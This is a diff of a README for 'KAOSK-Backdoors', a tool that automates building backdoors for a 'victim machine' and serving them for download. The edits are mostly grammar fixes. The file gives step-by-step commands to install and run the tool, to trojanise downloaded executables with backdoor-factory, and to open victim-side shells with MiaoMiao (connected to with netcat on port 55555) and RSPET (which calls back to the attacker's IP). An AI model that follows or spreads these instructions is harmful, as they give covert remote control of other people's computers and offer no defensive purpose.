@@ -1,6 +1,6 @@
 # KAOSK-Backdoors
 ==========
-It's a tool that automate: 
+It's a tool that automates: 
 + the installation of some Backdoor's creation programs
 + the creation of the backdoors to use in a victim machine
 + a web where you can download the backdoors created
@@ -14,6 +14,7 @@ Using any machine as the victim in the same network as the attacker.
 
 Run in Kali:
 + git clone https://github.com/carlospolop/KAOSK-backdoors.git
++ cd ./KAOSK-backdoors
 + python ./install.py
 + python ./create_backdoors.py 192.168.0.100
 + python ./handler.py 192.168.0.100
@@ -45,10 +46,10 @@ KAOSK has been tested in Kali2.
 python ./install.py
 
 ## Create Backdoors
-python ./create_backdoors.py <IP_attacker>
+python ./create_backdoors.py IP_attacker
 
 ## Start handler
-python ./handler.py <IP_attacker>
+python ./handler.py IP_attacker
 
 
 # To Know about the backdoors
@@ -62,14 +63,14 @@ python ./handler.py <IP_attacker>
 + Unicorn
 
 ## Backdoor-factory
-The backdoor-factory introduce the backdoor inside executables.
+The backdoor-factory introduces the backdoors inside executables.
 
-If you want to corrupt a executable, you just have to download the original, move it to the correct folder inside ./BDF_prepared and run python ./create_backdoors.py <IP_attacker> (or python ./backdoor-factoryAuto.py <IP_attacker>)
+If you want to corrupt a executable, you just have to download the original, move it to the correct folder inside ./BDF_prepared and run python ./create_backdoors.py IP_attacker (or python ./backdoor-factoryAuto.py IP_attacker)
 
 https://github.com/secretsquirrel/the-backdoor-factory.git
 
 ## MiaoMiao
-This backdoor open a port in the victims machine and the attacker connects to it. The default port is 55555
+This backdoor opens a port in the victims machine and the attacker connects to it. The default port is 55555
 To use this backdoor you have to run:
 + Victim: Run MiaoMiamo_folder/src_backdoor/server_dist/newest_version
 + Attacker: nc IP_Victim 55555 -vv
@@ -88,7 +89,7 @@ https://github.com/n1nj4sec/pupy.git
 
 ## RSPET
 To use this backdoor you have to run:
-+ Victim: Run python RSPET_folder/Client/rspet_client.py <IP_Attacker>
++ Victim: Run python RSPET_folder/Client/rspet_client.py IP_Attacker
 + Attacker: (This part is automated) Run Server > rspet_server.py 
 
 https://github.com/panagiks/RSPET.git
